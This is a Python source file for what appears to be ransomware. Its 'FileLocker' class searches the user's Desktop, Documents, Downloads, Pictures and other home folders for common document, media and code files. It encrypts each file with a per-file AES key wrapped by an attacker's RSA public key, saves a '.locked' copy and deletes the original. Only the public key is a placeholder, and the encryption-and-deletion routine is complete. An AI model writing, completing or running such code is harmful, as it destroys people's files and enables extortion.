from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.backends import default_backend
import secrets
import json

public_key = None # Replace with actual public key in PEM format

class FileLocker:
    def __init__(self):
        self.home = Path.home()
        self.locations = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos", "Public"]
        self.encrypt_ext = [".txt", ".pdf", ".csv", ".docx", ".doc", ".pptx", ".ppt", ".xlsx", ".xls", ".jpg", ".jpeg", ".png", ".mp3", ".mp4", ".py", ".html", ".css", ".js"]
        self.files = []

    def load_public_key(self):
        self.public_key = serialization.load_pem_public_key(
            public_key,
            backend=default_backend()
        )

    def encrypt_file(self, path):
        input_path = Path(path)
        output_path = input_path.with_suffix(input_path.suffix + ".locked")

        aes_key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        encrypted_aes_key = self.public_key.encrypt(
            aes_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()

        with open(input_path, "rb") as infile, open(output_path, "wb") as outfile:
            metadata = {
                "encrypted_key": encrypted_aes_key.hex(),
                "iv": iv.hex()
            }
            metadata_json = json.dumps(metadata).encode()
            outfile.write(len(metadata_json).to_bytes(4, "big"))
            outfile.write(metadata_json)

            while True:
                chunk = infile.read(8192)
                if not chunk:
                    break
                outfile.write(encryptor.update(padder.update(chunk)))

            outfile.write(encryptor.update(padder.finalize()))
            outfile.write(encryptor.finalize())
        
        input_path.unlink()
    
    def find_files(self):
        for location in self.locations:
            folder = self.home / location

            if folder.exists() and folder.is_dir():
                for file in folder.rglob("*"):
                    if file.is_file() and file.suffix in self.encrypt_ext:
                        self.files.append(file)

    def encrypt_files(self):
        for file in self.files:
            try:
                self.encrypt_file(file)
                print(f"[+] Encrypted: {file}")
            except:
                print(f"[-] Failed to encrypt: {file}")

    def main(self):
        self.load_public_key()
        self.find_files()
        self.encrypt_files()
